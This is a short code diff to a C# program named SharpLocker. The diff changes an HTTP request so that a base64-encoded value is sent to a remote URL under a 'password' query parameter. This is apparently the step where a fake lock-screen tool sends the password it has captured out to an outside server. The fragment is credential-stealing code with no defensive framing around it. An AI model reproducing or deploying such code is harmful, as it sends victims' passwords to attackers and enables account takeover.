@@ -57,7 +57,7 @@ namespace SharpLocker
                 p = Convert.ToBase64String(plainTextBytes);
             }
 
-            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url + "?" + p);
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url + "?password=" + p);
             req.GetResponse();
 
         }
